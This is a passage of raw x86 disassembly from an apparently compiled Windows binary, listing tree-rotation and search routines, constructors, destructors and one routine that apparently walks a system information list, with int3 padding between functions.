   13163:	mov    ebp,esp
   13165:	mov    edx,DWORD PTR [ebp+0x8]
   13168:	mov    eax,DWORD PTR [edx+0x8]
   1316b:	push   esi
   1316c:	mov    esi,DWORD PTR [eax]
   1316e:	mov    DWORD PTR [edx+0x8],esi
   13171:	mov    esi,DWORD PTR [eax]
   13173:	cmp    esi,DWORD PTR ds:0x7f6d8
   13179:	je     0x1317e
   1317b:	mov    DWORD PTR [esi+0x4],edx
   1317e:	mov    esi,DWORD PTR [edx+0x4]
   13181:	mov    DWORD PTR [eax+0x4],esi
   13184:	mov    ecx,DWORD PTR [ecx+0x4]
   13187:	pop    esi
   13188:	cmp    edx,DWORD PTR [ecx+0x4]
   1318b:	jne    0x13192
   1318d:	mov    DWORD PTR [ecx+0x4],eax
   13190:	jmp    0x131a0
   13192:	mov    ecx,DWORD PTR [edx+0x4]
   13195:	cmp    edx,DWORD PTR [ecx]
   13197:	jne    0x1319d
   13199:	mov    DWORD PTR [ecx],eax
   1319b:	jmp    0x131a0
   1319d:	mov    DWORD PTR [ecx+0x8],eax
   131a0:	mov    DWORD PTR [eax],edx
   131a2:	mov    DWORD PTR [edx+0x4],eax
   131a5:	pop    ebp
   131a6:	ret    0x4
   131a9:	int3   
   131aa:	int3   
   131ab:	int3   
   131ac:	int3   
   131ad:	int3   
   131ae:	mov    edi,edi
   131b0:	push   ebp
   131b1:	mov    ebp,esp
   131b3:	mov    edx,DWORD PTR [ebp+0x8]
   131b6:	mov    eax,DWORD PTR [edx]
   131b8:	push   esi
   131b9:	mov    esi,DWORD PTR [eax+0x8]
   131bc:	mov    DWORD PTR [edx],esi
   131be:	mov    esi,DWORD PTR [eax+0x8]
   131c1:	cmp    esi,DWORD PTR ds:0x7f6d8
   131c7:	je     0x131cc
   131c9:	mov    DWORD PTR [esi+0x4],edx
   131cc:	mov    esi,DWORD PTR [edx+0x4]
   131cf:	mov    DWORD PTR [eax+0x4],esi
   131d2:	mov    ecx,DWORD PTR [ecx+0x4]
   131d5:	pop    esi
   131d6:	cmp    edx,DWORD PTR [ecx+0x4]
   131d9:	jne    0x131e0
   131db:	mov    DWORD PTR [ecx+0x4],eax
   131de:	jmp    0x131ef
   131e0:	mov    ecx,DWORD PTR [edx+0x4]
   131e3:	cmp    edx,DWORD PTR [ecx+0x8]
   131e6:	jne    0x131ed
   131e8:	mov    DWORD PTR [ecx+0x8],eax
   131eb:	jmp    0x131ef
   131ed:	mov    DWORD PTR [ecx],eax
   131ef:	mov    DWORD PTR [eax+0x8],edx
   131f2:	mov    DWORD PTR [edx+0x4],eax
   131f5:	pop    ebp
   131f6:	ret    0x4
   131f9:	int3   
   131fa:	int3   
   131fb:	int3   
   131fc:	int3   
   131fd:	int3   
   131fe:	mov    edi,edi
   13200:	push   ebp
   13201:	mov    ebp,esp
   13203:	mov    eax,DWORD PTR [ecx+0x4]
   13206:	push   esi
   13207:	mov    esi,DWORD PTR [eax+0x4]
   1320a:	push   edi
   1320b:	mov    edi,eax
   1320d:	jmp    0x13228
   1320f:	lea    eax,[esi+0xc]
   13212:	push   eax
   13213:	push   DWORD PTR [ebp+0x8]
   13216:	call   0x19804
   1321b:	test   al,al
   1321d:	je     0x13225
   1321f:	mov    edi,esi
   13221:	mov    esi,DWORD PTR [esi]
   13223:	jmp    0x13228
   13225:	mov    esi,DWORD PTR [esi+0x8]
   13228:	cmp    esi,DWORD PTR ds:0x7f6d8
   1322e:	jne    0x1320f
   13230:	mov    eax,edi
   13232:	pop    edi
   13233:	pop    esi
   13234:	pop    ebp
   13235:	ret    0x4
   13238:	int3   
   13239:	int3   
   1323a:	int3   
   1323b:	int3   
   1323c:	int3   
   1323d:	int3   
   1323e:	mov    edi,edi
   13240:	push   ebp
   13241:	mov    ebp,esp
   13243:	mov    edx,DWORD PTR [ebp+0x8]
   13246:	mov    eax,DWORD PTR [edx+0x8]
   13249:	push   esi
   1324a:	mov    esi,DWORD PTR [eax]
   1324c:	mov    DWORD PTR [edx+0x8],esi
   1324f:	mov    esi,DWORD PTR [eax]
   13251:	cmp    esi,DWORD PTR ds:0x7f6dc
   13257:	je     0x1325c
   13259:	mov    DWORD PTR [esi+0x4],edx
   1325c:	mov    esi,DWORD PTR [edx+0x4]
   1325f:	mov    DWORD PTR [eax+0x4],esi
   13262:	mov    ecx,DWORD PTR [ecx+0x4]
   13265:	pop    esi
   13266:	cmp    edx,DWORD PTR [ecx+0x4]
   13269:	jne    0x13270
   1326b:	mov    DWORD PTR [ecx+0x4],eax
   1326e:	jmp    0x1327e
   13270:	mov    ecx,DWORD PTR [edx+0x4]
   13273:	cmp    edx,DWORD PTR [ecx]
   13275:	jne    0x1327b
   13277:	mov    DWORD PTR [ecx],eax
   13279:	jmp    0x1327e
   1327b:	mov    DWORD PTR [ecx+0x8],eax
   1327e:	mov    DWORD PTR [eax],edx
   13280:	mov    DWORD PTR [edx+0x4],eax
   13283:	pop    ebp
   13284:	ret    0x4
   13287:	int3   
   13288:	int3   
   13289:	int3   
   1328a:	int3   
   1328b:	int3   
   1328c:	mov    edi,edi
   1328e:	push   ebp
   1328f:	mov    ebp,esp
   13291:	mov    edx,DWORD PTR [ebp+0x8]
   13294:	mov    eax,DWORD PTR [edx]
   13296:	push   esi
   13297:	mov    esi,DWORD PTR [eax+0x8]
   1329a:	mov    DWORD PTR [edx],esi
   1329c:	mov    esi,DWORD PTR [eax+0x8]
   1329f:	cmp    esi,DWORD PTR ds:0x7f6dc
   132a5:	je     0x132aa
   132a7:	mov    DWORD PTR [esi+0x4],edx
   132aa:	mov    esi,DWORD PTR [edx+0x4]
   132ad:	mov    DWORD PTR [eax+0x4],esi
   132b0:	mov    ecx,DWORD PTR [ecx+0x4]
   132b3:	pop    esi
   132b4:	cmp    edx,DWORD PTR [ecx+0x4]
   132b7:	jne    0x132be
   132b9:	mov    DWORD PTR [ecx+0x4],eax
   132bc:	jmp    0x132cd
   132be:	mov    ecx,DWORD PTR [edx+0x4]
   132c1:	cmp    edx,DWORD PTR [ecx+0x8]
   132c4:	jne    0x132cb
   132c6:	mov    DWORD PTR [ecx+0x8],eax
   132c9:	jmp    0x132cd
   132cb:	mov    DWORD PTR [ecx],eax
   132cd:	mov    DWORD PTR [eax+0x8],edx
   132d0:	mov    DWORD PTR [edx+0x4],eax
   132d3:	pop    ebp
   132d4:	ret    0x4
   132d7:	int3   
   132d8:	int3   
   132d9:	int3   
   132da:	int3   
   132db:	int3   
   132dc:	mov    edi,edi
   132de:	push   ebp
   132df:	mov    ebp,esp
   132e1:	mov    eax,DWORD PTR [ecx+0x4]
   132e4:	mov    ecx,DWORD PTR [eax+0x4]
   132e7:	mov    edx,DWORD PTR ds:0x7f6dc
   132ed:	cmp    ecx,edx
   132ef:	je     0x1330a
   132f1:	push   esi
   132f2:	mov    esi,DWORD PTR [ebp+0x8]
   132f5:	mov    esi,DWORD PTR [esi]
   132f7:	cmp    esi,DWORD PTR [ecx+0xc]
   132fa:	jge    0x13302
   132fc:	mov    eax,ecx
   132fe:	mov    ecx,DWORD PTR [ecx]
   13300:	jmp    0x13305
   13302:	mov    ecx,DWORD PTR [ecx+0x8]
   13305:	cmp    ecx,edx
   13307:	jne    0x132f7
   13309:	pop    esi
   1330a:	pop    ebp
   1330b:	ret    0x4
   1330e:	int3   
   1330f:	int3   
   13310:	int3   
   13311:	int3   
   13312:	int3   
   13313:	int3   
   13314:	mov    edi,edi
   13316:	push   ebp
   13317:	mov    ebp,esp
   13319:	mov    eax,DWORD PTR [ecx+0x4]
   1331c:	push   esi
   1331d:	mov    esi,DWORD PTR [eax+0x4]
   13320:	push   edi
   13321:	mov    edi,eax
   13323:	jmp    0x1333e
   13325:	push   DWORD PTR [ebp+0x8]
   13328:	lea    eax,[esi+0xc]
   1332b:	push   eax
   1332c:	call   0x19834
   13331:	test   al,al
   13333:	je     0x1333a
   13335:	mov    esi,DWORD PTR [esi+0x8]
   13338:	jmp    0x1333e
   1333a:	mov    edi,esi
   1333c:	mov    esi,DWORD PTR [esi]
   1333e:	cmp    esi,DWORD PTR ds:0x7f6e4
   13344:	jne    0x13325
   13346:	mov    eax,edi
   13348:	pop    edi
   13349:	pop    esi
   1334a:	pop    ebp
   1334b:	ret    0x4
   1334e:	int3   
   1334f:	int3   
   13350:	int3   
   13351:	int3   
   13352:	int3   
   13353:	int3   
   13354:	mov    edi,edi
   13356:	push   ebp
   13357:	mov    ebp,esp
   13359:	mov    edx,DWORD PTR [ebp+0x8]
   1335c:	mov    eax,DWORD PTR [edx+0x8]
   1335f:	push   esi
   13360:	mov    esi,DWORD PTR [eax]
   13362:	mov    DWORD PTR [edx+0x8],esi
   13365:	mov    esi,DWORD PTR [eax]
   13367:	cmp    esi,DWORD PTR ds:0x7f6e4
   1336d:	je     0x13372
   1336f:	mov    DWORD PTR [esi+0x4],edx
   13372:	mov    esi,DWORD PTR [edx+0x4]
   13375:	mov    DWORD PTR [eax+0x4],esi
   13378:	mov    ecx,DWORD PTR [ecx+0x4]
   1337b:	pop    esi
   1337c:	cmp    edx,DWORD PTR [ecx+0x4]
   1337f:	jne    0x13386
   13381:	mov    DWORD PTR [ecx+0x4],eax
   13384:	jmp    0x13394
   13386:	mov    ecx,DWORD PTR [edx+0x4]
   13389:	cmp    edx,DWORD PTR [ecx]
   1338b:	jne    0x13391
   1338d:	mov    DWORD PTR [ecx],eax
   1338f:	jmp    0x13394
   13391:	mov    DWORD PTR [ecx+0x8],eax
   13394:	mov    DWORD PTR [eax],edx
   13396:	mov    DWORD PTR [edx+0x4],eax
   13399:	pop    ebp
   1339a:	ret    0x4
   1339d:	int3   
   1339e:	int3   
   1339f:	int3   
   133a0:	int3   
   133a1:	int3   
   133a2:	mov    edi,edi
   133a4:	push   ebp
   133a5:	mov    ebp,esp
   133a7:	mov    edx,DWORD PTR [ebp+0x8]
   133aa:	mov    eax,DWORD PTR [edx]
   133ac:	push   esi
   133ad:	mov    esi,DWORD PTR [eax+0x8]
   133b0:	mov    DWORD PTR [edx],esi
   133b2:	mov    esi,DWORD PTR [eax+0x8]
   133b5:	cmp    esi,DWORD PTR ds:0x7f6e4
   133bb:	je     0x133c0
   133bd:	mov    DWORD PTR [esi+0x4],edx
   133c0:	mov    esi,DWORD PTR [edx+0x4]
   133c3:	mov    DWORD PTR [eax+0x4],esi
   133c6:	mov    ecx,DWORD PTR [ecx+0x4]
   133c9:	pop    esi
   133ca:	cmp    edx,DWORD PTR [ecx+0x4]
   133cd:	jne    0x133d4
   133cf:	mov    DWORD PTR [ecx+0x4],eax
   133d2:	jmp    0x133e3
   133d4:	mov    ecx,DWORD PTR [edx+0x4]
   133d7:	cmp    edx,DWORD PTR [ecx+0x8]
   133da:	jne    0x133e1
   133dc:	mov    DWORD PTR [ecx+0x8],eax
   133df:	jmp    0x133e3
   133e1:	mov    DWORD PTR [ecx],eax
   133e3:	mov    DWORD PTR [eax+0x8],edx
   133e6:	mov    DWORD PTR [edx+0x4],eax
   133e9:	pop    ebp
   133ea:	ret    0x4
   133ed:	int3   
   133ee:	int3   
   133ef:	int3   
   133f0:	int3   
   133f1:	int3   
   133f2:	mov    edi,edi
   133f4:	push   esi
   133f5:	mov    esi,ecx
   133f7:	mov    ecx,DWORD PTR [esi]
   133f9:	cmp    DWORD PTR [ecx+0x1c],0x0
   133fd:	jne    0x1340c
   133ff:	mov    eax,DWORD PTR [ecx+0x4]
   13402:	cmp    DWORD PTR [eax+0x4],ecx
   13405:	jne    0x1340c
   13407:	mov    eax,DWORD PTR [ecx+0x8]
   1340a:	jmp    0x13429
   1340c:	mov    eax,DWORD PTR [ecx]
   1340e:	cmp    eax,DWORD PTR ds:0x7f6e4
   13414:	je     0x13422
   13416:	push   eax
   13417:	call   0x115b4
   1341c:	jmp    0x13429
   1341e:	mov    DWORD PTR [esi],eax
   13420:	mov    ecx,eax
   13422:	mov    eax,DWORD PTR [ecx+0x4]
   13425:	cmp    ecx,DWORD PTR [eax]
   13427:	je     0x1341e
   13429:	mov    DWORD PTR [esi],eax
   1342b:	pop    esi
   1342c:	ret    
   1342d:	int3   
   1342e:	int3   
   1342f:	int3   
   13430:	int3   
   13431:	int3   
   13432:	mov    edi,edi
   13434:	push   ebp
   13435:	mov    ebp,esp
   13437:	mov    eax,DWORD PTR [ecx+0x4]
   1343a:	mov    ecx,DWORD PTR [eax+0x4]
   1343d:	mov    edx,DWORD PTR ds:0x7f6cc
   13443:	cmp    ecx,edx
   13445:	je     0x13460
   13447:	push   esi
   13448:	mov    esi,DWORD PTR [ebp+0x8]
   1344b:	mov    esi,DWORD PTR [esi]
   1344d:	cmp    DWORD PTR [ecx+0xc],esi
   13450:	jae    0x13457
   13452:	mov    ecx,DWORD PTR [ecx+0x8]
   13455:	jmp    0x1345b
   13457:	mov    eax,ecx
   13459:	mov    ecx,DWORD PTR [ecx]
   1345b:	cmp    ecx,edx
   1345d:	jne    0x1344d
   1345f:	pop    esi
   13460:	pop    ebp
   13461:	ret    0x4
   13464:	int3   
   13465:	int3   
   13466:	int3   
   13467:	int3   
   13468:	int3   
   13469:	int3   
   1346a:	mov    edi,edi
   1346c:	push   ebp
   1346d:	mov    ebp,esp
   1346f:	mov    eax,DWORD PTR [ecx+0x4]
   13472:	mov    ecx,DWORD PTR [eax+0x4]
   13475:	mov    edx,DWORD PTR ds:0x7f6cc
   1347b:	cmp    ecx,edx
   1347d:	je     0x13498
   1347f:	push   esi
   13480:	mov    esi,DWORD PTR [ebp+0x8]
   13483:	mov    esi,DWORD PTR [esi]
   13485:	cmp    esi,DWORD PTR [ecx+0xc]
   13488:	jae    0x13490
   1348a:	mov    eax,ecx
   1348c:	mov    ecx,DWORD PTR [ecx]
   1348e:	jmp    0x13493
   13490:	mov    ecx,DWORD PTR [ecx+0x8]
   13493:	cmp    ecx,edx
   13495:	jne    0x13485
   13497:	pop    esi
   13498:	pop    ebp
   13499:	ret    0x4
   1349c:	int3   
   1349d:	int3   
   1349e:	int3   
   1349f:	int3   
   134a0:	int3   
   134a1:	int3   
   134a2:	mov    edi,edi
   134a4:	push   ebp
   134a5:	mov    ebp,esp
   134a7:	mov    ecx,DWORD PTR [ebp+0x8]
   134aa:	push   0x0
   134ac:	call   0x11678
   134b1:	pop    ebp
   134b2:	ret    0x4
   134b5:	int3   
   134b6:	int3   
   134b7:	int3   
   134b8:	int3   
   134b9:	int3   
   134ba:	mov    edi,edi
   134bc:	push   ebp
   134bd:	mov    ebp,esp
   134bf:	push   esi
   134c0:	push   edi
   134c1:	mov    edi,DWORD PTR [ebp+0x8]
   134c4:	push   edi
   134c5:	mov    esi,ecx
   134c7:	call   0x12c8a
   134cc:	mov    eax,DWORD PTR [edi+0x50]
   134cf:	mov    DWORD PTR [esi+0x50],eax
   134d2:	pop    edi
   134d3:	mov    eax,esi
   134d5:	pop    esi
   134d6:	pop    ebp
   134d7:	ret    0x4
   134da:	int3   
   134db:	int3   
   134dc:	int3   
   134dd:	int3   
   134de:	int3   
   134df:	int3   
   134e0:	mov    edi,edi
   134e2:	push   ebp
   134e3:	mov    ebp,esp
   134e5:	push   esi
   134e6:	push   edi
   134e7:	mov    edi,DWORD PTR [ebp+0x8]
   134ea:	push   edi
   134eb:	mov    esi,ecx
   134ed:	call   0x129aa
   134f2:	add    edi,0x8
   134f5:	push   edi
   134f6:	lea    ecx,[esi+0x8]
   134f9:	call   0x12c8a
   134fe:	pop    edi
   134ff:	mov    eax,esi
   13501:	pop    esi
   13502:	pop    ebp
   13503:	ret    0x4
   13506:	int3   
   13507:	int3   
   13508:	int3   
   13509:	int3   
   1350a:	int3   
   1350b:	int3   
   1350c:	mov    edi,edi
   1350e:	push   ebp
   1350f:	mov    ebp,esp
   13511:	push   esi
   13512:	mov    esi,ecx
   13514:	call   0x12ae0
   13519:	test   BYTE PTR [ebp+0x8],0x1
   1351d:	je     0x13526
   1351f:	push   esi
   13520:	call   0x10a9a
   13525:	pop    ecx
   13526:	mov    eax,esi
   13528:	pop    esi
   13529:	pop    ebp
   1352a:	ret    0x4
   1352d:	int3   
   1352e:	int3   
   1352f:	int3   
   13530:	int3   
   13531:	int3   
   13532:	mov    edi,edi
   13534:	push   ebp
   13535:	mov    ebp,esp
   13537:	push   esi
   13538:	push   edi
   13539:	mov    edi,DWORD PTR [ebp+0x8]
   1353c:	push   edi
   1353d:	mov    esi,ecx
   1353f:	call   0x129aa
   13544:	add    edi,0x8
   13547:	push   edi
   13548:	lea    ecx,[esi+0x8]
   1354b:	call   0x129aa
   13550:	pop    edi
   13551:	mov    eax,esi
   13553:	pop    esi
   13554:	pop    ebp
   13555:	ret    0x4
   13558:	int3   
   13559:	int3   
   1355a:	int3   
   1355b:	int3   
   1355c:	int3   
   1355d:	int3   
   1355e:	mov    edi,edi
   13560:	push   ebp
   13561:	mov    ebp,esp
   13563:	mov    eax,DWORD PTR [ebp+0x8]
   13566:	push   esi
   13567:	mov    esi,ecx
   13569:	mov    ecx,DWORD PTR [eax]
   1356b:	add    eax,0x4
   1356e:	mov    DWORD PTR [esi],ecx
   13570:	push   eax
   13571:	lea    ecx,[esi+0x4]
   13574:	call   0x11f0c
   13579:	mov    eax,esi
   1357b:	pop    esi
   1357c:	pop    ebp
   1357d:	ret    0x4
   13580:	int3   
   13581:	int3   
   13582:	int3   
   13583:	int3   
   13584:	int3   
   13585:	int3   
   13586:	mov    edi,edi
   13588:	push   ebp
   13589:	mov    ebp,esp
   1358b:	push   esi
   1358c:	mov    esi,ecx
   1358e:	mov    ecx,DWORD PTR [esi+0x4]
   13591:	test   ecx,ecx
   13593:	je     0x1359a
   13595:	call   0x10ab8
   1359a:	test   BYTE PTR [ebp+0x8],0x1
   1359e:	je     0x135a7
   135a0:	push   esi
   135a1:	call   0x10a9a
   135a6:	pop    ecx
   135a7:	mov    eax,esi
   135a9:	pop    esi
   135aa:	pop    ebp
   135ab:	ret    0x4
   135ae:	int3   
   135af:	int3   
   135b0:	int3   
   135b1:	int3   
   135b2:	int3   
   135b3:	int3   
   135b4:	mov    edi,edi
   135b6:	push   ebp
   135b7:	mov    ebp,esp
   135b9:	push   esi
   135ba:	push   edi
   135bb:	mov    edi,DWORD PTR [ebp+0x8]
   135be:	push   edi
   135bf:	mov    esi,ecx
   135c1:	call   0x12b3a
   135c6:	add    edi,0x8
   135c9:	push   edi
   135ca:	lea    ecx,[esi+0x8]
   135cd:	call   0x12b3a
   135d2:	pop    edi
   135d3:	mov    eax,esi
   135d5:	pop    esi
   135d6:	pop    ebp
   135d7:	ret    0x4
   135da:	int3   
   135db:	int3   
   135dc:	int3   
   135dd:	int3   
   135de:	int3   
   135df:	int3   
   135e0:	mov    edi,edi
   135e2:	push   ebp
   135e3:	mov    ebp,esp
   135e5:	push   esi
   135e6:	push   DWORD PTR [ebp+0x8]
   135e9:	mov    esi,ecx
   135eb:	call   0x129aa
   135f0:	push   DWORD PTR [ebp+0xc]
   135f3:	lea    ecx,[esi+0x8]
   135f6:	call   0x134ba
   135fb:	mov    eax,esi
   135fd:	pop    esi
   135fe:	pop    ebp
   135ff:	ret    0x8
   13602:	int3   
   13603:	int3   
   13604:	int3   
   13605:	int3   
   13606:	int3   
   13607:	int3   
   13608:	mov    edi,edi
   1360a:	push   ebp
   1360b:	mov    ebp,esp
   1360d:	push   esi
   1360e:	push   DWORD PTR [ebp+0x8]
   13611:	mov    esi,ecx
   13613:	call   0x12b3a
   13618:	push   DWORD PTR [ebp+0xc]
   1361b:	lea    ecx,[esi+0x8]
   1361e:	call   0x12b3a
   13623:	mov    eax,esi
   13625:	pop    esi
   13626:	pop    ebp
   13627:	ret    0x8
   1362a:	int3   
   1362b:	int3   
   1362c:	int3   
   1362d:	int3   
   1362e:	int3   
   1362f:	int3   
   13630:	mov    edi,edi
   13632:	push   ebp
   13633:	mov    ebp,esp
   13635:	push   edi
   13636:	mov    edi,DWORD PTR [ebp+0xc]
   13639:	cmp    DWORD PTR [ebp+0x8],edi
   1363c:	je     0x13652
   1363e:	push   esi
   1363f:	mov    esi,DWORD PTR [ebp+0x10]
   13642:	inc    DWORD PTR [esi]
   13644:	lea    ecx,[ebp+0x8]
   13647:	call   0x112ca
   1364c:	cmp    DWORD PTR [ebp+0x8],edi
   1364f:	jne    0x13642
   13651:	pop    esi
   13652:	pop    edi
   13653:	pop    ebp
   13654:	ret    
   13655:	int3   
   13656:	int3   
   13657:	int3   
   13658:	int3   
   13659:	int3   
   1365a:	mov    edi,edi
   1365c:	push   ebp
   1365d:	mov    ebp,esp
   1365f:	push   edi
   13660:	mov    edi,DWORD PTR [ebp+0xc]
   13663:	cmp    DWORD PTR [ebp+0x8],edi
   13666:	je     0x1367c
   13668:	push   esi
   13669:	mov    esi,DWORD PTR [ebp+0x10]
   1366c:	inc    DWORD PTR [esi]
   1366e:	lea    ecx,[ebp+0x8]
   13671:	call   0x11548
   13676:	cmp    DWORD PTR [ebp+0x8],edi
   13679:	jne    0x1366c
   1367b:	pop    esi
   1367c:	pop    edi
   1367d:	pop    ebp
   1367e:	ret    
   1367f:	int3   
   13680:	int3   
   13681:	int3   
   13682:	int3   
   13683:	int3   
   13684:	mov    edi,edi
   13686:	push   ebp
   13687:	mov    ebp,esp
   13689:	push   edi
   1368a:	mov    edi,DWORD PTR [ebp+0xc]
   1368d:	cmp    DWORD PTR [ebp+0x8],edi
   13690:	je     0x136a6
   13692:	push   esi
   13693:	mov    esi,DWORD PTR [ebp+0x10]
   13696:	inc    DWORD PTR [esi]
   13698:	lea    ecx,[ebp+0x8]
   1369b:	call   0x1157e
   136a0:	cmp    DWORD PTR [ebp+0x8],edi
   136a3:	jne    0x13696
   136a5:	pop    esi
   136a6:	pop    edi
   136a7:	pop    ebp
   136a8:	ret    
   136a9:	int3   
   136aa:	int3   
   136ab:	int3   
   136ac:	int3   
   136ad:	int3   
   136ae:	mov    edi,edi
   136b0:	push   ebp
   136b1:	mov    ebp,esp
   136b3:	push   edi
   136b4:	mov    edi,DWORD PTR [ebp+0xc]
   136b7:	cmp    DWORD PTR [ebp+0x8],edi
   136ba:	je     0x136d0
   136bc:	push   esi
   136bd:	mov    esi,DWORD PTR [ebp+0x10]
   136c0:	inc    DWORD PTR [esi]
   136c2:	lea    ecx,[ebp+0x8]
   136c5:	call   0x12f36
   136ca:	cmp    DWORD PTR [ebp+0x8],edi
   136cd:	jne    0x136c0
   136cf:	pop    esi
   136d0:	pop    edi
   136d1:	pop    ebp
   136d2:	ret    
   136d3:	int3   
   136d4:	int3   
   136d5:	int3   
   136d6:	int3   
   136d7:	int3   
   136d8:	mov    edi,edi
   136da:	push   ebx
   136db:	push   esi
   136dc:	push   edi
   136dd:	or     ebx,0xffffffff
   136e0:	push   ebx
   136e1:	mov    edi,0x1df30
   136e6:	push   edi
   136e7:	mov    esi,ecx
   136e9:	call   0x110ae
   136ee:	push   ebx
   136ef:	push   edi
   136f0:	lea    ecx,[esi+0x8]
   136f3:	call   0x110ae
   136f8:	push   ebx
   136f9:	push   edi
   136fa:	lea    ecx,[esi+0x14]
   136fd:	call   0x110ae
   13702:	push   ebx
   13703:	push   edi
   13704:	lea    ecx,[esi+0x1c]
   13707:	call   0x110ae
   1370c:	push   ebx
   1370d:	push   edi
   1370e:	lea    ecx,[esi+0x24]
   13711:	call   0x110ae
   13716:	push   ebx
   13717:	push   edi
   13718:	lea    ecx,[esi+0x48]
   1371b:	call   0x110ae
   13720:	xor    eax,eax
   13722:	mov    DWORD PTR [esi+0x10],eax
   13725:	mov    DWORD PTR [esi+0x30],eax
   13728:	mov    DWORD PTR [esi+0x2c],eax
   1372b:	mov    DWORD PTR [esi+0x40],eax
   1372e:	mov    DWORD PTR [esi+0x44],eax
   13731:	pop    edi
   13732:	mov    eax,esi
   13734:	pop    esi
   13735:	pop    ebx
   13736:	ret    
   13737:	int3   
   13738:	int3   
   13739:	int3   
   1373a:	int3   
   1373b:	int3   
   1373c:	mov    edi,edi
   1373e:	push   ebp
   1373f:	mov    ebp,esp
   13741:	push   esi
   13742:	push   DWORD PTR [ebp+0x8]
   13745:	mov    esi,ecx
   13747:	call   0x129aa
   1374c:	push   DWORD PTR [ebp+0xc]
   1374f:	lea    ecx,[esi+0x8]
   13752:	call   0x129aa
   13757:	mov    eax,DWORD PTR [ebp+0x10]
   1375a:	push   0xffffffff
   1375c:	push   0x1df30
   13761:	lea    ecx,[esi+0x14]
   13764:	mov    DWORD PTR [esi+0x10],eax
   13767:	call   0x110ae
   1376c:	push   DWORD PTR [ebp+0x14]
   1376f:	lea    ecx,[esi+0x1c]
   13772:	call   0x129aa
   13777:	push   DWORD PTR [ebp+0x18]
   1377a:	lea    ecx,[esi+0x24]
   1377d:	call   0x129aa
   13782:	mov    eax,DWORD PTR [ebp+0x20]
   13785:	push   DWORD PTR [ebp+0x1c]
   13788:	mov    DWORD PTR [esi+0x2c],eax
   1378b:	mov    eax,DWORD PTR [ebp+0x24]
   1378e:	lea    ecx,[esi+0x48]
   13791:	mov    DWORD PTR [esi+0x30],eax
   13794:	call   0x129aa
   13799:	and    DWORD PTR [esi+0x40],0x0
   1379d:	and    DWORD PTR [esi+0x44],0x0
   137a1:	mov    eax,DWORD PTR [ebp+0x28]
   137a4:	mov    ecx,DWORD PTR [eax]
   137a6:	mov    DWORD PTR [esi+0x38],ecx
   137a9:	mov    eax,DWORD PTR [eax+0x4]
   137ac:	mov    DWORD PTR [esi+0x3c],eax
   137af:	mov    eax,esi
   137b1:	pop    esi
   137b2:	pop    ebp
   137b3:	ret    0x24
   137b6:	int3   
   137b7:	int3   
   137b8:	int3   
   137b9:	int3   
   137ba:	int3   
   137bb:	int3   
   137bc:	mov    edi,edi
   137be:	push   ebp
   137bf:	mov    ebp,esp
   137c1:	push   esi
   137c2:	push   0xc
   137c4:	mov    esi,ecx
   137c6:	call   0x10a66
   137cb:	pop    ecx
   137cc:	test   eax,eax
   137ce:	je     0x137df
   137d0:	push   DWORD PTR [ebp+0xc]
   137d3:	mov    ecx,eax
   137d5:	push   DWORD PTR [ebp+0x8]
   137d8:	call   0x11f5a
   137dd:	jmp    0x137e1
   137df:	xor    eax,eax
   137e1:	mov    DWORD PTR [esi],eax
   137e3:	mov    eax,esi
   137e5:	pop    esi
   137e6:	pop    ebp
   137e7:	ret    0x8
   137ea:	int3   
   137eb:	int3   
   137ec:	int3   
   137ed:	int3   
   137ee:	int3   
   137ef:	int3   
   137f0:	mov    edi,edi
   137f2:	push   ebp
   137f3:	mov    ebp,esp
   137f5:	sub    esp,0x18
   137f8:	lea    eax,[ebp-0x18]
   137fb:	push   eax
   137fc:	push   DWORD PTR [ebp+0x8]
   137ff:	call   0x10ea4
   13804:	test   al,al
   13806:	je     0x13875
   13808:	lea    eax,[ebp-0x4]
   1380b:	push   eax
   1380c:	push   DWORD PTR [ebp+0xc]
   1380f:	call   0x11cb0
   13814:	call   eax
   13816:	test   eax,eax
   13818:	jl     0x13875
   1381a:	push   esi
   1381b:	push   0x5
   1381d:	call   0x12900
   13822:	mov    esi,eax
   13824:	test   esi,esi
   13826:	je     0x13874
   13828:	mov    edx,DWORD PTR [ebp+0x10]
   1382b:	cmp    DWORD PTR [esi+0x44],edx
   1382e:	je     0x1383d
   13830:	mov    ecx,DWORD PTR [eax]
   13832:	test   ecx,ecx
   13834:	je     0x13861
   13836:	add    eax,ecx
   13838:	cmp    DWORD PTR [eax+0x44],edx
   1383b:	jne    0x13830
   1383d:	cmp    DWORD PTR [eax+0x4],0x0
   13841:	je     0x13861
   13843:	mov    ecx,DWORD PTR [eax+0xd8]
   13849:	mov    eax,DWORD PTR [eax+0xdc]
   1384f:	mov    DWORD PTR [ebp-0x14],eax
   13852:	lea    eax,[ebp-0x18]
   13855:	push   eax
   13856:	push   DWORD PTR [ebp+0x8]
   13859:	mov    DWORD PTR [ebp-0x18],ecx
   1385c:	call   0x10ef2
   13861:	call   0x11c86
   13866:	mov    ecx,DWORD PTR [ebp-0x4]
   13869:	call   eax
   1386b:	push   0x0
   1386d:	push   esi
   1386e:	call   DWORD PTR ds:0x1f01c
   13874:	pop    esi
   13875:	leave  
   13876:	ret    0x10
   13879:	int3   
   1387a:	int3   
   1387b:	int3   
   1387c:	int3   
   1387d:	int3   
   1387e:	mov    edi,edi
   13880:	push   esi
   13881:	mov    esi,ecx
   13883:	mov    ecx,DWORD PTR [esi]
   13885:	mov    eax,DWORD PTR [ecx+0x8]
   13888:	cmp    eax,DWORD PTR ds:0x7f6d4
   1388e:	je     0x1389c
   13890:	push   eax
   13891:	call   0x12d10
   13896:	jmp    0x138ab
   13898:	mov    DWORD PTR [esi],eax
   1389a:	mov    ecx,eax
   1389c:	mov    eax,DWORD PTR [ecx+0x4]
   1389f:	cmp    ecx,DWORD PTR [eax+0x8]
   138a2:	je     0x13898
   138a4:	mov    ecx,DWORD PTR [esi]
   138a6:	cmp    DWORD PTR [ecx+0x8],eax
   138a9:	je     0x138ad
   138ab:	mov    DWORD PTR [esi],eax
   138ad:	pop    esi
   138ae:	ret    
   138af:	int3   
   138b0:	int3   
   138b1:	int3   
   138b2:	int3   
   138b3:	int3   
   138b4:	mov    edi,edi
   138b6:	push   ebp
   138b7:	mov    ebp,esp
   138b9:	push   esi
   138ba:	push   DWORD PTR [ebp+0x8]
   138bd:	mov    esi,ecx
   138bf:	call   0x129aa
   138c4:	push   DWORD PTR [ebp+0xc]
   138c7:	lea    ecx,[esi+0x8]
   138ca:	call   0x12c8a
   138cf:	mov    eax,esi
   138d1:	pop    esi
   138d2:	pop    ebp
   138d3:	ret    0x8
   138d6:	int3   
   138d7:	int3   
   138d8:	int3   
   138d9:	int3   
   138da:	int3   
   138db:	int3   
   138dc:	mov    edi,edi
   138de:	push   ebp
   138df:	mov    ebp,esp
